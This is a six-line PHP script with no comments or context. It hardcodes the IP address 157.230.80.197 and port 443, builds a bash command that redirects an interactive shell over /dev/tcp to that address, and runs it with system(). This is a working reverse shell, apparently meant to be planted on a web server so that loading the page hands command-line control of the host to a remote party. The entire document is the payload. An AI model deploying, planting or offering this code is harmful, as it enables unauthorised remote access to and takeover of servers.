<?php
$ip = '157.230.80.197';
$port = 443;
$cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1";
system($cmd);
?>
